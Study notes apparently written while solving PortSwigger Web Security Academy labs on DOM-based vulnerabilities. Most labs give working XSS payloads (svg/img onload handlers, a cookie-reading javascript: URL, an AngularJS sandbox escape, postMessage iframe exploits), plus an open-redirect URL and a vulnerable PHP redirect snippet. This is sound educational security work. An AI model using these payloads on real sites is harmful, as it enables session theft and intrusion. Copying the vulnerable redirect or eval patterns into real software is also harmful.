# DOM-based vulnerabilities

****Testing HTML sinks: find DOM by search through HTML tag, NOTE: IE11 not URL-encode [location.search](http://location.search) & location.hash, vice versa**

****Testing JavaScript execution sinks: JS debugger + search for source-sink, intercept to contruct XSS**** 

****Testing for DOM XSS using DOM Invader:**** 

Appendix: 

[EventTarget.addEventListener() - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener)

[Window.postMessage() - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)

### Common Sources

document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
[window.name](http://window.name/)
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database

## LAB 01: ****DOM-based open redirection****

Phishing, XSS, JS injection… 

Reason by accept untrusted data as part of redirection process…

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled.png)

The back to Blog button seem to accept a returnurl when redirecting, with onclick attribute, the user to the main page of the blog, so what if we can control the variable returnurl in this case?

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%201.png)

Redirect in progress and package

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%202.png)

```jsx
post?postId=5&url=https://exploit-[ID].exploit-server.net/
```

Appendix: [https://portswigger.net/kb/issues/00500110_open-redirection-dom-based](https://portswigger.net/kb/issues/00500110_open-redirection-dom-based)

[https://www.acunetix.com/blog/web-security-zone/what-are-open-redirects/](https://www.acunetix.com/blog/web-security-zone/what-are-open-redirects/)

[https://cwe.mitre.org/data/definitions/601.html](https://cwe.mitre.org/data/definitions/601.html)

[https://www.hackingarticles.in/comprehensive-guide-on-open-redirect/](https://www.hackingarticles.in/comprehensive-guide-on-open-redirect/)

```php
$redirect_url = $_GET['url'];
header("Location: " . $redirect_url);
```

## LAB 02: ****DOM XSS in `document.write` sink using source `location.search`**

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%203.png)

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%204.png)

```jsx
'"<a onload=javascript:alert(1);>button</a>
"><svg onload=alert(1)>
```

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%205.png)

Whatever user input anything in the search field, the string will go directly to the sink which is document.write to generate an a tag contain href concat with the string the user input, which is untrusted data, and output to the page. So, if the input can break the logic by escape with double quote and inject html tag to run the JS → XSS

## LAB 03: ****DOM XSS in `document.write` sink using source `location.search` inside a select element**

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%206.png)

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%207.png)

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%208.png)

```jsx
product?productId=2&storeId=">'<script>alert(1)</script>
```

This time, we want to break the line contains  [document.write('<select name="storeId">');]. Because whatever you input to the param storeId will go directly to the document.write, that lead to the cause of XSS when user input is controllable and can try to inject some tag that can perform like alert.

## LAB 04: ****DOM XSS in `innerHTML` sink using source `location.search`**

Try with DOM invader

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%209.png)

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2010.png)

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2011.png)

Close the double quote and tag, then start a new tag is allowed.

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2012.png)

```jsx
'"<svg onload=javascript:alert(1);>button</a><!--
'"<a onload=javascript:alert(1);>button</a><!--
```

## LAB 05: ****DOM XSS in jQuery anchor `href` attribute sink using `location.search` source**

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2013.png)

```jsx
javascript:alert(document.cookie);
```

returnPath always take the root [/] as the return path to the home page and set it directly to the back <a> tag, and function written in jQuery is taking the returnPath param directly from the URL without any santinize or validation. So, what if we change the returnPath directly from the URL to some kind that match with href attribute in a tag that trigger alert event?

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2014.png)

Appendix: 

[https://www.javatpoint.com/what-is-jquery](https://www.javatpoint.com/what-is-jquery)

## LAB 06: ****DOM XSS in jQuery selector sink using a hashchange event*****

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2015.png)

```jsx
<iframe src="https://[ID].web-security-academy.net#" onload="this.src+='<svg onload=print()>'">
//testing [ /?<img%20src%20onerror=alert(1)>location.search=<img%20src%20onerror=alert(1)># ]
```

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2016.png)

## LAB 07: ****DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded*****

Appendix:

[https://www.w3schools.com/angular/ng_ng-app.asp](https://www.w3schools.com/angular/ng_ng-app.asp)

[https://www.geeksforgeeks.org/angularjs-ng-app-directive/](https://www.geeksforgeeks.org/angularjs-ng-app-directive/)

## LAB 08: ****Reflected DOM XSS****

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2017.png)

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2018.png)

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2019.png)

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2020.png)

```jsx
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText); //danger
            displaySearchResults(searchResultsObj);
        }
    }
    ;
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i) {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("img");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}
```

```jsx
\"-alert(1)}//
```

Appendix: 

[https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

[https://www.programmerall.com/article/21121902434/](https://www.programmerall.com/article/21121902434/)

[https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText)

## LAB 09: ****DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded****

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2021.png)

Testing with AngularJS sink. Noted that the webapp using AngularJS and everything inside body is enclosed with ng-app. Due to the security functions and angularJS sandbox, we need craft a payload that escape the sandbox and enable angularJS to perform script cause JS is totally standalone with angularJS.

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2022.png)

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2023.png)

```jsx
{{constructor.constructor('alert(1)')()}}
```

Appendix: 

[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected)

## LAB 10: **DOM XSS using web messages**

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2024.png)

Sink of the vulnerable.

A web want to embed a home website which is our main page lab, which contains the script to listen events above, as an ad to their page. Then receive the content of the others page and put in a div tag with id ‘ads’. This open a vuln to the main page ( our page ) that the message in event listener not completely validate the message argument which take parameters from the others page to, which then if we craft a iframe tag which contains malicious code that take advantage of JS to perform XSS.

Appendix: 

[https://www.w3schools.com/jsref/met_element_addeventlistener.asp](https://www.w3schools.com/jsref/met_element_addeventlistener.asp)

[https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)

```jsx
<iframe src="https://[ID].web-security-academy.net" width="400" height="400" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>', '*');"/>
```

### NOTE: <embed> vs <iframe>, why embed can not interact with DOM

[Difference between iframe, embed and object elements](https://stackoverflow.com/questions/16660559/difference-between-iframe-embed-and-object-elements)

## LAB 11: **DOM XSS using web messages and a JavaScript URL**

Sink of the vuln

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2025.png)

![Untitled](DOM-based%20vulnerabilities%20c27e0e8262ca4ddca6f7036be727c3c5/Untitled%2026.png)

So, in this case, we want to inject malicious JS code to the location.href in the above code through the event listener that serve as a method for other page to embed the main page as the ‘ads’ for them. Strange here is that the main page want to put the message of the others page send to them as the DOM location href which is really danger to directly assign like in this case.

```jsx
<iframe src="https://[ID].web-security-academy.net" width="400" height="400" onload="this.contentWindow.postMessage('javascript:print()//http:', '*');"/>
```